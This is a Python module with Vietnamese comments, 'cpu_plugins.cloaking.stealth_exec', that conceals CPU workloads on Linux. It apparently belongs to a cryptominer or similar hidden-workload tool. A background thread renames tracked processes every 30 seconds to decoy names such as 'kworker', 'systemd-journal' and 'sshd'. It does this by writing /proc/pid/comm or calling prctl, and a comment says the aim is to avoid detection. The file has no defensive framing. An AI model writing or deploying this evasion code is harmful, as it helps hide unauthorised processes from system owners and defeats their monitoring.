"""cpu_plugins.cloaking.stealth_exec

Module che giấu quá trình thực thi CPU.
Tối ưu hóa từ stealth_execution.py, loại bỏ các chức năng không cần thiết.
"""
import os
import sys
import random
import threading
import subprocess
import time
from typing import List, Dict, Any, Optional, Set
import logging
import ctypes
import ctypes.util

class StealthExecution:
    """Thực thi ẩn danh cho các tiến trình CPU."""
    
    def __init__(
        self, 
        logger: Optional[logging.Logger] = None,
        comm_rotation_interval: int = 30,
    ):
        """Khởi tạo StealthExecution."""
        self.logger = logger or logging.getLogger(__name__)
        self.comm_rotation_interval = comm_rotation_interval
        self._running = False
        self._thread = None
        self._tracked_pids: Set[int] = set()
        
        # Các tiến trình giả mạo thông thường
        self._decoy_processes = [
            "systemd-journal",
            "systemd-udevd",
            "kworker/0:1",
            "kworker/u16:0",
            "rcu_sched",
            "irqbalance",
            "dbus-daemon",
            "cron",
            "sshd",
            "rsyslogd"
        ]
    
    def start(self) -> bool:
        """Bắt đầu che giấu."""
        if self._running:
            return True
            
        self._running = True
        self._thread = threading.Thread(
            target=self._stealth_loop,
            daemon=True
        )
        self._thread.start()
        self.logger.info("Stealth execution started")
        return True
    
    def stop(self) -> bool:
        """Dừng che giấu."""
        if not self._running:
            return True
            
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
            
        self.logger.info("Stealth execution stopped")
        return True
    
    def add_process(self, pid: int) -> bool:
        """Thêm tiến trình để che giấu."""
        if pid <= 0:
            return False
            
        self._tracked_pids.add(pid)
        self.logger.debug(f"Added PID {pid} to stealth tracking")
        return True
    
    def _stealth_loop(self):
        """Vòng lặp chính cho che giấu."""
        while self._running:
            try:
                # Xoay vòng tên tiến trình
                self._rotate_process_names()
                
                # Ngủ một khoảng thời gian
                time.sleep(self.comm_rotation_interval)
                
            except Exception as e:
                self.logger.error(f"Error in stealth loop: {e}")
                time.sleep(5)
    
    def _rotate_process_names(self):
        """Xoay vòng tên tiến trình để tránh phát hiện."""
        for pid in list(self._tracked_pids):
            try:
                # Kiểm tra tiến trình còn tồn tại
                if not self._is_process_alive(pid):
                    self._tracked_pids.remove(pid)
                    continue
                
                # Chọn tên ngẫu nhiên
                new_name = random.choice(self._decoy_processes)
                
                # Thay đổi tên tiến trình
                self._change_process_name(pid, new_name)
                
            except Exception as e:
                self.logger.error(f"Error rotating name for PID {pid}: {e}")
    
    def _is_process_alive(self, pid: int) -> bool:
        """Kiểm tra tiến trình còn sống không."""
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False
    
    def _change_process_name(self, pid: int, new_name: str) -> bool:
        """Thay đổi tên tiến trình."""
        try:
            # Sử dụng /proc để thay đổi tên
            comm_path = f"/proc/{pid}/comm"
            if os.path.exists(comm_path):
                with open(comm_path, "w") as f:
                    f.write(new_name)
                return True
        except Exception:
            pass
            
        # Phương thức fallback
        try:
            # Sử dụng prctl nếu có thể
            libc = ctypes.CDLL(ctypes.util.find_library('c'))
            if hasattr(libc, 'prctl'):
                # PR_SET_NAME = 15
                libc.prctl(15, new_name.encode(), 0, 0, 0)
                return True
        except Exception:
            pass
            
        return False 